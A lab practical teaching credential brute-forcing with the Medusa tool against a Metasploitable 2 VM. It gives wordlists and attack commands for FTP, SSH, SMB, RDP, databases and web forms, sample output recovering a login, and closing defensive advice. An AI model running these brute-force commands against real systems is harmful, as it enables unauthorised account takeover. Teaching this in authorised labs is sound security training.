# Practical 11: Cracking Login Credentials using `medusa`

## Objective

In this practical we use **Medusa** (`medusa`) to perform an online brute-force / dictionary attack against a network service. Given a target host, a username list, and a password list, Medusa tries every combination against the chosen service module and reports any successful login.

Medusa is functionally similar to Hydra (Practical 10) but with a different architecture — it is **modular**, **thread-based per-host**, and often more reliable on flaky services.

---

## Tool Overview

**Medusa** is a fast, parallel, modular login brute-forcer written by JoMo-Kun (Foofus Networks). Each protocol is implemented as a separate `.mod` shared library, which keeps the core lean and lets new protocols be added without rebuilding the tool.

**Key design points:**

- **Thread-based parallelism** — multiple users tested in parallel per host, multiple hosts in parallel.
- **Modular** — each protocol is a separate `.mod` file in `/usr/lib/x86_64-linux-gnu/medusa/modules/`.
- **Flexible input** — single user/password, lists of either, or a `host:user:pass` combo file.
- **Resumable** with a state file.

**Supported services (selected):** `ftp`, `ssh`, `telnet`, `smtp-vrfy`, `pop3`, `imap`, `smbnt`, `mssql`, `mysql`, `postgres`, `rdp`, `vnc`, `http`, `web-form`, `rlogin`, `rsh`, `vmauthd`, `cvs`, `nntp`, `snmp`, `svn`, `wrapper`.

---

## Prerequisites

- A Linux system (Kali / Parrot / Ubuntu / Debian).
- `medusa` installed (pre-installed on Kali and Parrot).

```bash
which medusa
medusa -V          # version
medusa -d          # list available modules
```

Install if missing:

```bash
sudo apt update
sudo apt install medusa -y
```

- A target you are authorised to test (this example uses **Metasploitable 2** in an isolated VM lab).
- Username and password wordlists:

```bash
cat > /root/Desktop/users.txt <<EOF
root
admin
msfadmin
user
ftpuser
postgres
mysql
EOF

cat > /root/Desktop/pass.txt <<EOF
password
123456
admin
msfadmin
toor
letmein
postgres
mysql
ftp
EOF
```

---

## Step 1: Discover the Target Service

Confirm the service before attacking it:

```bash
nmap -sV -p 21,22,23,3306 192.168.0.103
```

**Sample output:**

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet  Linux telnetd
3306/tcp open  mysql   MySQL 5.0.51a-3ubuntu5
```

Multiple services are exposed — any of them is a valid target.

List the protocols Medusa supports:

```bash
medusa -d
```

**Sample output (truncated):**

```
Medusa v5.4-rc2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

Available modules in "."

Available modules in "/usr/lib/x86_64-linux-gnu/medusa/modules"
  + cvs.mod        : Brute force module for CVS sessions
  + ftp.mod        : Brute force module for FTP/FTPS sessions
  + http.mod       : Brute force module for HTTP
  + imap.mod       : Brute force module for IMAP sessions
  + mssql.mod      : Brute force module for M$-SQL sessions
  + mysql.mod      : Brute force module for MySQL sessions
  + ncp.mod        : Brute force module for NCP sessions
  + nntp.mod       : Brute force module for NNTP sessions
  + pcanywhere.mod : Brute force module for PcAnywhere sessions
  + pop3.mod       : Brute force module for POP3 sessions
  + postgres.mod   : Brute force module for PostgreSQL sessions
  + rdp.mod        : Brute force module for Microsoft RDP
  + rexec.mod      : Brute force module for REXEC sessions
  + rlogin.mod     : Brute force module for RLOGIN sessions
  + rsh.mod        : Brute force module for RSH sessions
  + smbnt.mod      : Brute force module for SMB sessions
  + smtp-vrfy.mod  : Brute force module for SMTP VRFY/EXPN
  + snmp.mod       : Brute force module for SNMP Community Strings
  + ssh.mod        : Brute force module for SSH v2 sessions
  + svn.mod        : Brute force module for SVN sessions
  + telnet.mod     : Brute force module for telnet sessions
  + vmauthd.mod    : Brute force module for the VMware Authentication Daemon
  + vnc.mod        : Brute force module for VNC sessions
  + web-form.mod   : Brute force module for web forms
  + wrapper.mod    : Generic Wrapper Module
```

---

## Step 2: Medusa Syntax

The general form (matching the practical description) is:

```
medusa -h <host> -U <userlist> -P <passlist> -M <service> [options]
```

### Common Options

| Flag         | Meaning                                                          |
| ------------ | ---------------------------------------------------------------- |
| `-h <host>`  | Target host (IP or hostname)                                     |
| `-H <file>`  | File containing multiple targets                                 |
| `-u <user>`  | Single username                                                  |
| `-U <file>`  | File with usernames                                              |
| `-p <pass>`  | Single password                                                  |
| `-P <file>`  | File with passwords                                              |
| `-C <file>`  | Combo file (`host:user:pass` per line)                           |
| `-M <module>`| Service module (`ftp`, `ssh`, `mysql`, …) — **required**         |
| `-m <opt>`   | Pass option to the module (e.g. form fields)                     |
| `-n <port>`  | Non-default port                                                 |
| `-s`         | Use SSL                                                          |
| `-t <num>`   | Concurrent logins per host (default 1)                           |
| `-T <num>`   | Concurrent hosts in parallel (default 1)                         |
| `-f`         | Stop scanning host after first valid credential                  |
| `-F`         | Stop scanning ALL hosts after first valid credential globally    |
| `-e ns`      | Also try empty (`n`) and same-as-login (`s`) passwords           |
| `-O <file>`  | Log output to file                                               |
| `-v <n>`     | Verbose level 0–6                                                |
| `-w <n>`     | Error-debug level 0–6                                            |
| `-r <sec>`   | Sleep between retries                                            |
| `-R <num>`   | Retries on connection failure                                    |
| `-Z <text>`  | Resume from a previous state                                     |

---

## Step 3: Run Medusa Against FTP

The practical's command, in correct Medusa syntax, looks like this:

```bash
medusa -h 192.168.0.103 \
       -U /root/Desktop/users.txt \
       -P /root/Desktop/pass.txt \
       -M ftp \
       -t 5 -f -v 4
```

| Part of the command                | Purpose                                  |
| ---------------------------------- | ---------------------------------------- |
| `-h 192.168.0.103`                 | Target host                              |
| `-U /root/Desktop/users.txt`       | Username list                            |
| `-P /root/Desktop/pass.txt`        | Password list                            |
| `-M ftp`                           | Service module                           |
| `-t 5`                             | 5 parallel logins per host               |
| `-f`                               | Stop attacking this host on first hit    |
| `-v 4`                             | Verbose output (shows each attempt)      |

**Sample output (truncated):**

```
Medusa v5.4-rc2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 192.168.0.103 (1/1) User: root (1/7) Password: password (1/9)
ACCOUNT CHECK: [ftp] Host: 192.168.0.103 (1/1) User: root (1/7) Password: 123456  (2/9)
ACCOUNT CHECK: [ftp] Host: 192.168.0.103 (1/1) User: root (1/7) Password: admin   (3/9)
...
ACCOUNT CHECK: [ftp] Host: 192.168.0.103 (1/1) User: msfadmin (3/7) Password: msfadmin (4/9)
ACCOUNT FOUND: [ftp] Host: 192.168.0.103 User: msfadmin Password: msfadmin [SUCCESS]
```

### Confirmation Message

The success line follows this format:

```
ACCOUNT FOUND: [<module>] Host: <ip> User: <user> Password: <pass> [SUCCESS]
```

### Save Output to a Log File

```bash
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ftp -O ftp_creds.log
cat ftp_creds.log
```

```
# Medusa v5.4-rc2 - log
ACCOUNT FOUND: [ftp] Host: 192.168.0.103 User: msfadmin Password: msfadmin [SUCCESS]
```

### Verify the Credential

```bash
ftp 192.168.0.103
# Name: msfadmin
# Password: msfadmin
# 230 Login successful.
```

---

## Step 4: Medusa Against Other Common Services

The recipe is identical — only `-M` (and sometimes `-n`/`-s`) changes.

**SSH:**

```bash
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ssh -t 4 -f
```

> Use a low `-t` for SSH; many servers throttle or drop high-concurrency clients.

**Telnet:**

```bash
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M telnet -t 4
```

**MySQL:**

```bash
medusa -h 192.168.0.103 -u root -P pass.txt -M mysql
```

**PostgreSQL:**

```bash
medusa -h 192.168.0.103 -u postgres -P pass.txt -M postgres
```

**MS-SQL:**

```bash
medusa -h 192.168.0.50 -U users.txt -P pass.txt -M mssql
```

**SMB / Windows shares:**

```bash
medusa -h 192.168.0.50 -U users.txt -P pass.txt -M smbnt
```

**RDP:**

```bash
medusa -h 192.168.0.50 -U users.txt -P pass.txt -M rdp -t 1
```

**VNC (password only):**

```bash
medusa -h 192.168.0.103 -u "" -P pass.txt -M vnc
```

**HTTP Basic Auth:**

```bash
medusa -h 192.168.0.1 -U users.txt -P pass.txt -M http -m DIR:/admin
```

**HTTP POST web form (DVWA-style):**

```bash
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M web-form \
  -m FORM:"/dvwa/login.php" \
  -m DENY-SIGNAL:"Login failed" \
  -m FORM-DATA:"post?username=&password=&Login=Login"
```

> Web-form syntax varies — see `medusa -M web-form -q` for module-specific options.

---

## Step 5: Useful Tactical Tweaks

### 5.1 Stop on First Hit (`-f` / `-F`)

```bash
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ftp -f
```

`-f` stops attacking the **current host** after one hit; `-F` stops the **entire run**.

### 5.2 Try the Easy Cases First (`-e ns`)

```bash
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ftp -e ns
```

- `n` — empty password.
- `s` — password same as username (e.g. `admin:admin`).

### 5.3 Combo File (`-C`)

A combo file lists `host:user:pass` triples — perfect for default-credential sweeps across many hosts:

```bash
cat > combos.txt <<EOF
192.168.0.103:admin:admin
192.168.0.103:root:root
192.168.0.103:msfadmin:msfadmin
192.168.0.104:admin:admin
192.168.0.105:admin:password
EOF

medusa -C combos.txt -M ftp
```

### 5.4 Multiple Targets (`-H`)

```bash
cat > targets.txt <<EOF
192.168.0.103
192.168.0.104
192.168.0.105
EOF

medusa -H targets.txt -U users.txt -P pass.txt -M ssh -T 3 -t 4
```

`-T 3` runs three hosts in parallel; `-t 4` runs four logins per host.

### 5.5 Resume an Aborted Run (`-Z`)

If Medusa is interrupted, it prints a state token. Resume with:

```bash
medusa -Z h2.u4.p17 -h 192.168.0.103 -U users.txt -P pass.txt -M ftp
```

The `h.u.p` numbers tell Medusa which host/user/password index to start from.

---

## Step 6: Pair with Wordlists Built in Earlier Practicals

```bash
# CUPP profile-based list (Practical 7)
medusa -h 192.168.0.103 -U users.txt -P ~/wordlists/john_doe_cupp.txt -M ssh -t 4 -f

# cewl site-scraped list (Practical 9)
medusa -h 192.168.0.103 -U users.txt -P wordlist.txt -M ftp -f

# crunch generated list (Practical 8)
crunch 6 6 -t admin% -o gen.txt
medusa -h 192.168.0.103 -u admin -P gen.txt -M ftp
```

---

## Medusa vs Hydra — Practical Differences

| Aspect                | Hydra                                       | Medusa                                          |
| --------------------- | ------------------------------------------- | ----------------------------------------------- |
| Architecture          | Single binary, per-target threading         | Modular `.mod` plugins, per-host threading      |
| Protocol coverage     | Larger (50+)                                | Slightly smaller, but covers all the common ones |
| Default verbosity     | Quiet — use `-v/-V`                         | Quiet — use `-v 4`                              |
| Success line          | `[port][service] host: ... login: ...`      | `ACCOUNT FOUND: [module] Host: ... User: ...`   |
| Combo file format     | `user:pass` (`-C`)                          | `host:user:pass` (`-C`)                         |
| Multi-host            | `-M targets.txt`                            | `-H targets.txt`                                |
| Resume                | `hydra.restore` + `-R`                      | State token + `-Z`                              |
| Reliability on flaky links | Good                                   | Often more reliable / fewer crashes              |

In practice, both tools should be in a pentester's toolkit — run whichever first, and if one stalls on a target, try the other.

---

## Quick Reference

```bash
# 1. List modules
medusa -d

# 2. FTP brute force (the practical's command)
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ftp -t 5 -f -v 4

# 3. SSH (low concurrency)
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ssh -t 4 -f

# 4. SMB / Windows
medusa -h 192.168.0.50 -U users.txt -P pass.txt -M smbnt

# 5. MySQL
medusa -h 192.168.0.103 -u root -P pass.txt -M mysql

# 6. RDP
medusa -h 192.168.0.50 -U users.txt -P pass.txt -M rdp -t 1

# 7. Try empty & same-as-login first
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ftp -e ns -f

# 8. Combo file
medusa -C host_user_pass.txt -M ftp

# 9. Multiple targets in parallel
medusa -H targets.txt -U users.txt -P pass.txt -M ssh -T 3 -t 4

# 10. Save log
medusa -h 192.168.0.103 -U users.txt -P pass.txt -M ftp -O run.log
```

---

## Observations / Conclusion

Using Medusa against the Metasploitable target on FTP we recovered `msfadmin:msfadmin` and confirmed the credential by logging in. Key takeaways:

1. Medusa offers a **clean, modular** alternative to Hydra with the same brute-force capabilities.
2. The `ACCOUNT FOUND` confirmation line gives a clear, parseable result — easy to chain into shell scripts (`grep ACCOUNT_FOUND`).
3. Combining Medusa with **good wordlists** (CUPP, crunch, cewl, breach corpora) is the single biggest determinant of success.
4. Like Hydra, Medusa is **loud** — every attempt is a real authentication and shows up in target logs, IDS, and rate-limit counters.

---

## Defensive Recommendations

- **Strong, long, unique passwords** + ban breach-corpus passwords at creation time.
- **Multi-Factor Authentication (MFA)** on every externally-exposed service — defeats Medusa outright.
- **Account lockout / progressive throttling** after a small number of failed attempts.
- **Rate-limit** login attempts per source IP (`fail2ban`, `sshguard`, WAF rules).
- **Disable plaintext services** (FTP, Telnet, HTTP Basic) — use SFTP, SSH, and HTTPS.
- **Restrict management ports** (21, 22, 23, 445, 3306, 3389, 5432) to trusted networks or VPN.
- **Log and alert** on repeated authentication failures, especially across many usernames from one IP — a classic Medusa/Hydra signature.
- **Honey-accounts** (e.g. an `admin` account that should never receive a real login attempt) fire alerts the moment Medusa touches them.

---

## Disclaimer

This practical is for **educational purposes** only and must be performed only on systems and accounts you own or have explicit written authorisation to test. Online brute-force attacks against systems you do not control are illegal under laws such as the Information Technology Act in India and the Computer Fraud and Abuse Act in the US. Even a "successful" credential discovered without authorisation must not be used to log in.
